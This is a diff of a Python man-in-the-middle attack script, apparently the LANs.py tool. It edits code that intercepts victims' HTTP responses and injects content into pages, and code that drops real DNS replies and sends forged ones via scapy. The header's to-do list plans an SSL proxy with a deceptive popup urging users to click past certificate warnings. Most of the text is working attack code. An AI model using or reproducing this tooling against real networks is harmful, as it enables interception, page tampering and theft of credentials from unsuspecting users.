@@ -15,7 +15,6 @@ Note: 			This script flushes iptables before and after usage.
 To do:			Add karma MITM technique
 				Add SSL proxy for self-signed cert, and make the script force a single JS popup saying there's a temporary problem with SSL validation and to just click through
 				Add anticaching (just edit the headers)
-				Replace wget with python requests library
 				Ability to add option which will add a delay, allowing user to modify HTML/email/irc/usernames and passwords on the fly (how much interest is there in this?)
 
 '''
@@ -24,6 +23,14 @@ __license__ = 'BSD'
 __contact__ = 'danhmcinerney with gmail'
 __version__ = 1.0
 
+try:
+	import nfqueue
+except:
+	nfq = raw_input('[-] python-nfqueue not installed, would you like to install now? (apt-get install -y python-nfqueue will be run if yes) [y/n]: ')
+	if nfq == 'y':
+		os.system('apt-get install -y python-nfqueue')
+	else:
+		exit('[-] Exiting due to missing dependency')
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
@@ -40,17 +47,10 @@ from subprocess import *
 from twisted.internet import reactor
 from twisted.internet.interfaces import IReadDescriptor
 from twisted.internet.protocol import Protocol, Factory
-try:
-	import nfqueue
-except:
-	nfq = raw_input('[-] python-nfqueue not installed, would you like to install now? (apt-get install -y python-nfqueue will be run if yes) [y/n]: ')
-	if nfq == 'y':
-		os.system('apt-get install -y python-nfqueue')
-	else:
-		exit('[-] Exiting due to missing dependency')
 from zlib import decompressobj, decompress
 import gzip
 from cStringIO import StringIO
+import requests
 
 def parse_args():
 	#Create the arguments
@@ -222,22 +222,23 @@ class Parser():
 			return
 
 		if sport == 80 and self.html_url and 'Content-Type: text/html' in headers:
+			# This can be done better, probably using filter()
+			header_lines = [x for x in header_lines if 'transfer-encoding' not in x.lower()]
 			for h in header_lines:
-				if '1.1 302' in h or '1.1 301' in h:
-					payload.set_verdict(nfqueue.NF_ACCEPT)
-					self.html_url = None
-					return
-				elif 'Transfer-Encoding: chunked' in h or 'transfer-encoding: chunked' in h:
+				if '1.1 302' in h or '1.1 301' in h: # Allow redirects to go thru unperturbed
 					payload.set_verdict(nfqueue.NF_ACCEPT)
 					self.html_url = None
 					return
 
-			# -O saves it to ~body in working dir, to speed it up -4 means only use IPv4 and --no-dns-cache speeds it up a little more
-			wget = Popen(['/usr/bin/wget', '-O', '/tmp/~body', '--no-dns-cache', '-4', '-U', self.user_agent, self.html_url], stdout=PIPE, stderr=DN)
-			wget.wait()
-			f = open('/tmp/~body', 'r')
-			body = f.read()
-			f.close
+			UA_header = {'User-Agent':self.user_agent}
+			r = requests.get('http://'+self.html_url, headers=UA_header)
+			try:
+				body = r.text.encode('utf-8')
+			except:
+				payload.set_verdict(nfqueue.NF_ACCEPT)
+			debugger = open('/home/user/projects/origBody', 'w')
+			debugger.write(body)
+			debugger.close()
 
 			# INJECT
 			if self.args.beef:
@@ -273,9 +274,12 @@ class Parser():
 			# Recompress data if necessary
 			if 'Content-Encoding: gzip' in headers:
 				if body != '':
+#					debugger = open('/home/user/projects/injectedBody', 'w')
+#					debugger.write(body)
+#					debugger.close()
 					try:
 						comp_body = StringIO()
-						f = gzip.GzipFile(fileobj=comp_body, mode='wb', compresslevel = 6)
+						f = gzip.GzipFile(fileobj=comp_body, mode='w', compresslevel = 9)
 						f.write(body)
 						f.close()
 						body = comp_body.getvalue()
@@ -295,6 +299,7 @@ class Parser():
 							payload.set_verdict(nfqueue.NF_ACCEPT)
 							return
 
+			headers = "\r\n".join(header_lines)
 			pkt[Raw].load = headers+"\r\n\r\n"+body
 			pkt[IP].len = len(str(pkt))
 			del pkt[IP].chksum
@@ -693,6 +698,7 @@ class Parser():
 			logger.write('[!] Decoded:'+decoded+'\n')
 
 	# Spoof DNS for a specific domain to point to your machine
+	# Make this more reliable by blocking all DNS responses from the server using the IP_src maybe a self.dnsSrc var
 	def dnsspoof(self, dns_layer, IP_src, IP_dst, sport, dport, payload):
 		if self.args.dnsspoof:
 			if self.args.dnsspoof in dns_layer.qd.qname and not self.args.redirectto:
@@ -702,9 +708,9 @@ class Parser():
 				self.dnsspoof_actions(dns_layer, IP_src, IP_dst, sport, dport, payload, self.args.redirectto)
 
 	def dnsspoof_actions(self, dns_layer, IP_src, IP_dst, sport, dport, payload, rIP):
+		payload.set_verdict(nfqueue.NF_DROP)
 		print G+'[+] DNS request for '+W+self.args.dnsspoof+G+' found; dropping packet and injecting spoofed one redirecting to '+W+rIP
 		logger.write('[+] DNS request for '+self.args.dnsspoof+' found; dropping packet and injecting spoofed one redirecting to '+rIP+'\n')
-		payload.set_verdict(nfqueue.NF_DROP)
 		p = IP(dst=IP_src, src=IP_dst)/UDP(dport=sport, sport=dport)/DNS(id=dns_layer.id, qr=1, aa=1, qd=dns_layer.qd, an=DNSRR(rrname=dns_layer.qd.qname, ttl=10, rdata=rIP))
 		send(p)
 		print G+'[!] Sent spoofed packet for '+W+self.args.dnsspoof+G+' to '+W+rIP
@@ -1031,7 +1037,7 @@ def main(args):
 			dnsMAC = Spoof().originalMAC(dnsIP)
 			print "[*] DNS server MAC: " + dnsMAC
 		except:
-			print "[-] Could not get DNS server MAC address"
+			print "[-] Could not get DNS server MAC address; continuing"
 	if dnsIP == routerIP:
 		dnsMAC = routerMAC
 
